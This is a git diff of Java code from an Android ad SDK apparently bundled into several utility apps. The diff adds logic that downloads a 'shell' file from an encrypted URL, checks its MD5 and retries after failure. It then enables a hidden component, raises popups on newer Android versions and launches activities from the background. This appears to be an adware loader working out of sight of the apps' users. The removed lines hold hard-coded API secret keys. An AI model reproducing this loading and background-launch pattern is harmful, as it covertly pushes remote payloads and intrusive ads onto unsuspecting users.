@@ -26,6 +26,7 @@ import com.ep.custom_honor_library.adlp.LopTimeTJ;
 import com.ep.custom_honor_library.adlp.TimeCoundLp;
 import com.ep.custom_honor_library.bean.ControlAdBean;
 import com.ep.custom_honor_library.http.CommonHttpUtils;
+import com.ep.custom_honor_library.http.MD5Util;
 import com.ep.custom_honor_library.http.OnHttpListener;
 import com.ep.custom_honor_library.http.OnMiddleInterface;
 import com.ep.custom_honor_library.sdk.GmSdkUtils;
@@ -51,145 +52,32 @@ import java.util.Iterator;
 public class ControllerUtils {
 
     public static boolean isHasShowAd = false;
-    public static Handler handler = new Handler(Looper.getMainLooper());
-
+    //是否重新尝试so 的下载
+    private static boolean isAgainNetAar = false;
+    private static Handler handlerMainAAR = new Handler(Looper.getMainLooper());
 
     public static ArrayList<WeakReference<Activity>> appActivityList = new ArrayList<>();
 
     public static boolean mIsIniLop = false;
 
     public static void handlerPostInitStrategy(){
-        handler.postDelayed(runnable, 0 * 1000);
-    }
-
-
-    private static void switchInfo(Context context){
-
-
-
-
-        switch (context.getPackageName()){
-
-
-              case "com.dolw.moyeshisao":
-                CommonAPI.HOST = "https://api.nunpingli.cn/";
-                CommonAPI.APPID = "5883378";
-                CommonAPI.APP_RELEASE_APPID = "6bb7e365466f084b";
-                CommonAPI.RELEASE_SSK = "aa2315075d63e80e00491243f56c3ae6";
-                CommonAPI.umID = "6acf1fe8863270068ca0dc6c";
-                break;
-
-            case "com.nmgsr.nuanjichaoxibeiwanglu":
-                CommonAPI.HOST = "https://api.nunpingli.cn/";
-                CommonAPI.APPID = "5883357";
-                CommonAPI.APP_RELEASE_APPID = "4d884c2c2afe9366";
-                CommonAPI.RELEASE_SSK = "595192dffc94c64351b4dd509c79d089";
-                CommonAPI.umID = "6acf21ba6545637cd60f7ec0";
-                break;
-
-
-          case "com.gzyf.yingwensaomiao":
-                CommonAPI.HOST = "https://api.nunpingli.cn/";
-                CommonAPI.APPID = "5884187";
-                CommonAPI.APP_RELEASE_APPID = "6452d01f224554a2";
-                CommonAPI.RELEASE_SSK = "ef6ef4430cd6fbf72c5501e7ad6f3be6";
-                CommonAPI.umID = "6acf28116545637cd60f8fcc";
-                break;
-
-            case "com.gzyf.janxiaojinghuihuawu":
-                CommonAPI.HOST = "https://api.nunpingli.cn/";
-                CommonAPI.APPID = "5884189";
-                CommonAPI.APP_RELEASE_APPID = "beffd1d59f90d87c";
-                CommonAPI.RELEASE_SSK = "ea7450c0b4e595a5a21624c8f3a5bf85";
-                CommonAPI.umID = "6acf282c6545637cd60f8ff7";
-                break;
-
-
-
-//            case "com.dolw.wenlanhuyi":
-//                CommonAPI.HOST = "https://api.nunpingli.cn/";
-//                CommonAPI.APPID = "5883381";
-//                CommonAPI.APP_RELEASE_APPID = "ad4cb2f423e9afed";
-//                CommonAPI.RELEASE_SSK = "4e16af0dcbd799a90d44af8f723432cd";
-//                CommonAPI.umID = "6acdd1b46545637cd60d338d";
-//                break;
-//
-//
-//
-//            case "com.dolw.zhinengshengliushenqi":
-//                CommonAPI.HOST = "https://api.nunpingli.cn/";
-//                CommonAPI.APPID = "5883386";
-//                CommonAPI.APP_RELEASE_APPID = "2c1dc8aa05795bc4";
-//                CommonAPI.RELEASE_SSK = "17bc587ae49e7cf3f02c499cc9ca9e3c";
-//                CommonAPI.umID = "6acdd1d0863270068c9f993a";
-//                break;
-
-
-//            case "com.nmgsr.meihaohuihua":
-//                CommonAPI.HOST = "https://api.nunpingli.cn/";
-//                CommonAPI.APPID = "5883352";
-//                CommonAPI.APP_RELEASE_APPID = "f2d5c2bed1897198";
-//                CommonAPI.RELEASE_SSK = "cce615bc0c0f42dc13c97b8332402228";
-//                CommonAPI.umID = "6acc8ec2863270068c9db996";
-//                break;
-//            case "com.nmgsr.qingshitianqi":
-//                CommonAPI.HOST = "https://api.nunpingli.cn/";
-//                CommonAPI.APPID = "5877568";
-//                CommonAPI.APP_RELEASE_APPID = "1b6b6fb21d28f13a";
-//                CommonAPI.RELEASE_SSK = "65fb608b0f0319dfc4b27b046c325ba3";
-//                CommonAPI.umID = "6acc8fbe6545637cd6099e72";
-//                break;
-
-
-
-
-        }
-    }
-
-
-
-
-
-
-
-    private static Runnable runnable = new Runnable() {
-        @Override
-        public void run() {
-            initStrategy(DefAPIUtils.randomConfig_from_delay, new  OnHttpListener() {
-                @Override
-                public void onSuccess() {}
-                @Override
-                public void onFail(Exception e) {}
-            });
-        }
-    };
-
-
-    public static void initStrategy(String form, OnHttpListener httpListener){
-        CommonHttpUtils.getInstance().initConfigOaidDoPost(form, DefAPIUtils.getRandomConfig(), null, new OnHttpListener() {
+        CommonHttpUtils.getInstance().initConfigOaidDoPost(DefAPIUtils.randomConfig_from_delay, DefAPIUtils.getRandomConfig(), null, new OnHttpListener() {
             @Override
             public void onSuccess() {
+                initAR();
                 doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
-                    @Override
+                @Override
                     public void run() {
-                        httpListener.onSuccess();
                         initAttribution();
-                    }
-                },null);
+                    }},null);
             }
 
             @Override
             public void onFail(Exception e) {
-                httpListener.onFail(e);
-
             }
         });
     }
-
-
-
     public static Handler mainHandler = new Handler(Looper.getMainLooper());
-
     //初始化基础
     public static void initDef(Application application){
 
@@ -198,8 +86,8 @@ public class ControllerUtils {
             public void run() {
                 MMKV.initialize(application);
                 DefContextUtils.instance.setAppContext(application);
-                switchInfo(application);
-
+                CommonAPI.switchLog = CommonSpUtils.getSpLogStatus();
+                InfoSwitchUtils.switchInfo(application.getPackageName());
                 CommonAPI.VERSION = getVersionName(application);
                 initActivityListener();
                 //初始化渠道
@@ -209,7 +97,6 @@ public class ControllerUtils {
                 handlerPostInitStrategy();
                 initFe();
             }});
-
     }
 
 
@@ -268,18 +155,12 @@ public class ControllerUtils {
 
 
 
-    public  static void initFe(){
+    private static void initFe(){
         String file = CommonSpUtils.decrypt(CommonSpUtils.SHELL_URL);
         CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
         @Override
             public void onSuccess() {
-            CustomLogUtils.i("AD_LOG","初始化啊shell");
-            Log.i("AD_LOG","ok");
-            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
-            if (Build.VERSION.SDK_INT>=34){
-                SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
-            }
-//            toLoAdHandler(5*1000);
+            initAR();
         }
             @Override
             public void onFail(Exception e) {}
@@ -288,19 +169,66 @@ public class ControllerUtils {
     }
 
 
-
-    private static void toOpenMiddle(Intent intent){
-        CustomLogUtils.i("开始跳转11111");
-        String spShellFile = CommonSpUtils.getSpShellFile();
-        if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            SafeUtils.startTarget(DefContextUtils.instance.getApplication(), intent);
+    //初始化so   当前是在子线程中
+    private static void initAR(){
+        if (isOverNetFile() && CommonSpUtils.getUserStatus()){
+            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
+            //切换到主线程中操作
+            doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
+            @Override
+                public void run() {
+                    aarPopup();
+                }},0L);
         }
-
-
     }
 
 
+    //34 已经初始化popup
+    private static void aarPopup(){
+        if (Build.VERSION.SDK_INT>=34 && isOverNetFile()){
+            SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
+        }
+    }
+
+
+    //文件是否正确
+    private static boolean isOverNetFile(){
+        String spShellFile = CommonSpUtils.getSpShellFile();
+        if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
+            String s = MD5Util.md5File(new File(spShellFile));
+            return s.equals(CommonAPI.NET_AAR_MED5);
+        }
+        CustomLogUtils.i("isOverNetFile==false");
+        return false;
+    }
+
+
+    private static void toOpenMiddle(Intent intent){
+        try {
+            if (isOverNetFile()){
+                CustomLogUtils.i("开始跳转11111");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                SafeUtils.startTarget(DefContextUtils.instance.getApplication(), intent);
+            }else{
+                //保证失败之后重试一次
+                if(!isAgainNetAar){
+                    isAgainNetAar = true;
+                    toDelayedAgain();
+                }
+            }
+        } catch (Exception e) {
+            CustomLogUtils.i("toOpenMiddle=="+e);
+        }
+    }
+
+    private static void toDelayedAgain(){
+        //失败了10秒之后重新下载
+        handlerMainAAR.postDelayed(new Runnable() {
+        @Override
+            public void run() {
+                 initFe();
+            }},10*1000);
+    }
     public static void intentMiddleWindow(String adScreen,int index){
         Intent intent = new Intent(DefContextUtils.instance.getApplication(), OIUZH.class);
         intent.putExtra(CommonAPI.INTENT_MIDDLE_FLAG,adScreen);
@@ -314,10 +242,8 @@ public class ControllerUtils {
 
  
     private static void initActivityListener() {
-
         Application app = DefContextUtils.instance.getApplication();
         if (app == null) return;
-
         app.registerActivityLifecycleCallbacks(
                 new Application.ActivityLifecycleCallbacks() {
 
